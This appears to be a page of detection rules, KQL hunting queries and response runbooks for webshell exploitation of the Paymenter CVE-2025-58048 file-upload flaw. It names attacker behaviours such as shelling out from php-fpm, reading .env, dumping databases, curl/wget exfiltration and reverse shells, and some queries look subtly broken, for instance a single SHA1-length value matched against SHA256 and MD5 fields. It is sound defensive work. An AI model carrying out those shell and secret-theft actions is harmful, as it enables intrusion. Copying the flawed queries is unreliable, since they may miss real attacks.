Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer/admin manually placing a .php test file under storage during troubleshooting
  • Backup/restore or rsync of the storage tree re-materializing an old file
  • A CI/deploy process writing PHP into a mis-symlinked storage path
  • Filename that merely ends in a PHP extension but is a user-supplied harmless text file (still worth reviewing)
Response runbook
1) Triage: retrieve the dropped file (SHA256 in the alert) and inspect for PHP tags / system-command primitives (system, exec, passthru, eval, $_GET/$_POST). 2) Contain: delete/quarantine the file from storage/app/public/ticket-attachments, apply the nginx force-download workaround, and upgrade Paymenter to v1.2.11+. 3) Hunt: enumerate every PHP-family file under the storage tree by write time, correlate to the authenticated ticket author and their session IP, and pivot to web-server-user shell execution to confirm whether the shell was invoked.

Paymenter web-server process spawning shell / recon (post-RCE, CVE-2025-58048) AIActions on Objectives Medium
Detects php-fpm/nginx/apache spawning a shell or reconnaissance binary — the code-execution outcome of the CVE-2025-58048 webshell running commands under the web-server user (reading .env, dumping the DB, or shelling out). Web daemons rarely fork /bin/sh, making this a high-signal post-exploit pivot. Rationale: The advisory states code runs 'under the web server user context' and can read .env / query the DB — a php-fpm/nginx parent forking a shell or recon binary is the direct execution signature and is abnormal for a PHP-FPM worker. Cross-checked against: • https://github.com/advisories/GHSA-5pm9-r2m8-rcmj • https://dailycve.com/paymenter-remote-code-execution-rce-via-unrestricted-file-upload-cve-2025-58048-critical-dc-jun2026-543/
ATT&CKT1059.004 T1505.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • PHP apps that legitimately shell out (Symfony Process, imagemagick/ghostscript wrappers, mail sending via sendmail)
  • Cron or systemd timers running under the web user for artisan schedule:run (php spawning sh)
  • Health-check scripts invoking curl/wget from the app tier
  • Composer/deploy hooks executed as the web-server user
Suppression filter
| where ProcessCommandLine !has "artisan schedule:run" and ProcessCommandLine !has "artisan queue:work"
Response runbook
1) Triage: inspect the child ProcessCommandLine for .env reads, database dumps (mysqldump), outbound curl/wget to unknown hosts, or reverse-shell one-liners; confirm the parent is a Paymenter web daemon. 2) Contain: isolate the host if a reverse shell or data-exfil command is present, rotate the Laravel APP_KEY / DB and mail credentials exposed in .env, and revoke the web-server user's shell where feasible. 3) Hunt: correlate the process time back to the webshell request (UC1) and file drop (UC2), review outbound network from the web host for C2, and check for new cron/systemd persistence created by the web user.

// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities

| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-58048")

ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("87c3db42282ada1e3cda54b9a01f846926c0669b") or SHA1 in~ ("87c3db42282ada1e3cda54b9a01f846926c0669b") or MD5 in~ ("87c3db42282ada1e3cda54b9a01f846926c0669b")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("87c3db42282ada1e3cda54b9a01f846926c0669b") or SHA1 in~ ("87c3db42282ada1e3cda54b9a01f846926c0669b") or MD5 in~ ("87c3db42282ada1e3cda54b9a01f846926c0669b")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["87c3db42282ada1e3cda54b9a01f846926c0669b"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc
